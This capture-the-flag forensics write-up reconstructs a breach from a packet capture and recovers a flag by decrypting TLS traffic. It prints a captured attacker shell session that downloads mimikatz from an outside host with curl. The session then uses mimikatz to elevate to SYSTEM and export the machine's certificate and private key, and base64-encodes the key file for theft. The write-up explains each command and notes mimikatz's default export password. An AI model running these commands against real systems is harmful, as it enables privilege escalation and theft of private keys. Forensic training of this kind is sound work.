# Breached server (forensics) (author: stn)

## Tools

**wireshark** - must have - we are provided with a capture that we need to analyze

**openssl** or another tool that can work with certificates

## Description

```shell
Oh no, one of our servers got breached. Can you find out what was stolen?
```

## Task analysis & solution

In the task, we are provided with a wireshark capture. Upon loading the trace file, we can see there are several captured sessions in it. Some ecnrypted TLS communication that seems to repeat throughout the capture, but also communication on port 4444. This immediately rings a bell, because that port is often used by backdoor trojans for remote access to compromised machines. Considering our task here is called "breached server", there must be something interesting in there. Let's follow the stream and analyse the communication by setting this display filter:

```shell
tcp.stream eq 1
```

```shell
Microsoft Windows [Version 10.0.20348.1970]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Downloads>whoami
whoami
cyberxmas\administrator

C:\Users\Administrator\Downloads>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator\Downloads> curl.exe 10.1.0.1:8000/mimi.zip -o mimi.zip
curl.exe 10.1.0.1:8000/mimi.zip -o mimi.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 1177k  100 1177k    0     0   214M      0 --:--:-- --:--:-- --:--:--  230M
PS C:\Users\Administrator\Downloads> Expand-Archive .\mimi.zip
Expand-Archive .\mimi.zip
PS C:\Users\Administrator\Downloads> dir
dir


    Directory: C:\Users\Administrator\Downloads


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        12/13/2023   6:57 AM                mimi                                                                 
-a----        12/13/2023   6:57 AM        1206166 mimi.zip                                                             
-a----        12/13/2023   6:30 AM           7168 reverse.exe                                                          


PS C:\Users\Administrator\Downloads> cmd /c .\mimi\x64\mimikatz.exe privilege::debug token::elevate crypto::capi "crypto::certificates /systemstore:LOCAL_MACHINE /store:my /export" exit
cmd /c .\mimi\x64\mimikatz.exe privilege::debug token::elevate crypto::capi "crypto::certificates /systemstore:LOCAL_MACHINE /store:my /export" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

560	{0;000003e7} 1 D 17900     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;0003eca1} 2 D 4463438   	CYBERXMAS\Administrator	S-1-5-21-2199754053-1680100800-3657874571-500	(18g,26p)	Primary
 * Thread Token  : {0;000003e7} 1 D 4512737   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz(commandline) # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz(commandline) # crypto::certificates /systemstore:LOCAL_MACHINE /store:my /export
 * System Store  : 'LOCAL_MACHINE' (0x00020000)
 * Store         : 'my'

 0. ctf cert
    Subject  : CN=mprvm-03.cyberXmas.ctf
    Issuer   : CN=mprvm-03.cyberXmas.ctf
    Serial   : c94531e6ac77b74ba6fb80f0c3b7c618
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 12/13/2023 5:22:01 AM -> 12/12/2024 4:00:00 PM
    Hash SHA1: 943855bfb3c56d32bdf3402b76afda4442ae65d7
	Key Container  : a15895e1-770f-4c8d-a68b-38f5ea56845a
	Provider       : Microsoft RSA SChannel Cryptographic Provider
	Provider type  : RSA_SCHANNEL (12)
	Type           : AT_KEYEXCHANGE (0x00000001)
	|Provider name : Microsoft RSA SChannel Cryptographic Provider
	|Key Container : a15895e1-770f-4c8d-a68b-38f5ea56845a
	|Unique name   : a64dd3977c69cf9c982773e8bcd041b5_684ae3df-a7e0-4573-825d-d02ae73708c5
	|Implementation: CRYPT_IMPL_SOFTWARE ; 
	Algorithm      : CALG_RSA_KEYX
	Key size       : 2048 (0x00000800)
	Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
	Exportable key : YES
	Public export  : OK - 'LOCAL_MACHINE_my_0_ctf cert.der'
	Private export : OK - 'LOCAL_MACHINE_my_0_ctf cert.pfx'


mimikatz(commandline) # exit
Bye!
PS C:\Users\Administrator\Downloads> dir
dir


    Directory: C:\Users\Administrator\Downloads


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        12/13/2023   6:57 AM                mimi                                                                 
-a----        12/13/2023   6:57 AM            791 LOCAL_MACHINE_my_0_ctf cert.der                                      
-a----        12/13/2023   6:57 AM           2635 LOCAL_MACHINE_my_0_ctf cert.pfx                                      
-a----        12/13/2023   6:57 AM        1206166 mimi.zip                                                             
-a----        12/13/2023   6:30 AM           7168 reverse.exe                                                          


PS C:\Users\Administrator\Downloads> [Convert]::ToBase64String([IO.File]::ReadAllBytes("LOCAL_MACHINE_my_0_ctf cert.pfx"))
<omitted the base64 encoded pfx file for brevity>
PS C:\Users\Administrator\Downloads> exit
exit

C:\Users\Administrator\Downloads>exit
exit
```

That's a lot of information, but let's try and break it down.

We can see that the attacker has acess to Windows command prompt and executes the "whoami" command that retuns the logged on user. Then they open up a powershell session and execute a curl command to download "mimi.zip" which contains the mimikatz tool (more on that later). Then they extract the content of the archive and check the content of the current directory by executing a "dir" command. Then they run mimikatz.exe with certain parameters.

```shell
cmd /c .\mimi\x64\mimikatz.exe privilege::debug token::elevate crypto::capi "crypto::certificates /systemstore:LOCAL_MACHINE /store:my /export" exit
```

Mimikatz is a post-exploitation tool commonly used for credential harvesting on Windows systems. 

1. mimikatz.exe: This is the executable for Mimikatz.

2. privilege::debug: This command attempts to enable debug privileges on the current process. Debug privileges are powerful and often required for certain actions, such as reading or modifying the memory of other processes.

3. token::elevate: This command attempts to elevate the current process's privileges by impersonating a system token. This is a crucial step for obtaining higher-level privileges on the system.

4. crypto::capi: This loads the Microsoft CryptoAPI module in Mimikatz. CryptoAPI is a set of functions for performing cryptographic operations in Windows.

5. "crypto::certificates /systemstore:LOCAL_MACHINE /store:my /export": This command, once the CryptoAPI module is loaded, is intended to export certificates from the "my" store of the LOCAL_MACHINE system store. The "my" store typically contains certificates associated with the local machine. The /export option indicates that the certificates should be exported.

Once this is executed, we can see some output related to a "ctf" certificate. The next command is just a dir, that shows us the content of our working directory - we can see a .pfx and .der files in there. PFX files are essentially the cryptographic key pairs - public and private that are used for securing communication between machines. The last and final command is a powershell cmdlet, that reads the PFX files, encodes it to base64 and prints it out. My immediate thought here was to grab the output, decode back to binary and write it to a file. That way we have the original PFX file that is exported. It can be done with a similar reverse powershell script (or use an online converter to a file like https://base64.guru/converter/decode/file):

```powershell
$base64Data = "<base64 input omitted for brevity>"
$outputFilePath = "decoded_cert.pfx"
$binaryData = [System.Convert]::FromBase64String($base64Data)
$binaryData | Set-Content -Path $outputFilePath -Encoding Byte -Force
```

I now had the PFX file, but there was one problem with it - it is still password protected. And I'll include a huge note in here, that I and the team lost a lot of time on: **mimikatz exports certificates with a default password: mimikatz**. Needless to say, we wasted a lot of time trying to crack the PFX file with pfx2john and john, all in vain. We could've input the password from the get go.

Now, once I had the password, I could extract the private key and then give it to wireshark to try and decrypt that TLS communication. The extraction could be done with **openssl** (comes preinstalled on Kali Linux and could be installed on Windows or used from an existing GIT installation). I have a Git installation, so I used it like this - note the folder where I'm executing the command from, that's where openssl.exe is:

```powershell
PS C:\Program Files\Git\usr\bin> .\openssl.exe pkcs12 -in .\decoded_cert.pfx -nocerts -out priv-key.pem -nodes
```

Once I had the private key file, I went back to the capture file loaded in Wireshark, Edit -> Preferences. In the Protocols sections selected TLS and then I clicked on the Edit button right next to "RSA key list". That opens up the TLS Decrypt window, where I could add a new entry with the plus button at the bottom: wrote the IP of the server - 10.10.0.3 in our case and then gave it the .pem file I extracted. That let me see the encrypted communication right away and no surprises there, it was a flag.txt file. To extract it, I went to File -> Export Objects -> HTTP (we had a similar challenge earlier in Cyberxmas, where we had to extract an mp4 file from an HTTP stream) and I saved the flag.txt file. 

The flag itself was **MilestoneCTF{stolen-certificate-is-no-joke}**